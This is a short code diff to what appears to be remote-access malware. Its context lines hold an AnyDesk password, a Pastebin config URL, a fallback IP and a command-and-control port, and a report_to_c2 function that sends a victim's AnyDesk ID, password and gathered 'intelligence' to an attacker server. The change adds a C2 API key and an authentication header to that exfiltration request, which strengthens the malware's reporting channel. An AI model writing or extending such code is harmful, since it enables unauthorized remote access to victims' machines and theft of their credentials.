@@ -108,6 +108,7 @@ ANYDESK_PASSWORD = "secretsauce123"
 CONFIG_URL = "https://pastebin.com/raw/YgNuztHj"
 FALLBACK_IP = "52.21.29.104"
 C2_PORT = 8080
+C2_API_KEY = "kestrel_c2_2024_secure_key_f8a9b2c1d4e5"  # API key for authentication
 
 
 def is_dev_mode():
@@ -524,7 +525,14 @@ def report_to_c2(anydesk_id, password, intelligence, execution_time):
             import urllib.request
 
             data = json.dumps(report).encode("utf-8")
-            req = urllib.request.Request(c2_url, data=data, headers={"Content-Type": "application/json"})
+            req = urllib.request.Request(
+                c2_url,
+                data=data,
+                headers={
+                    "Content-Type": "application/json",
+                    "X-API-Key": C2_API_KEY,
+                },
+            )
 
             with urllib.request.urlopen(req, timeout=2) as response:
                 log(f"Report sent successfully (attempt {attempt + 1})")
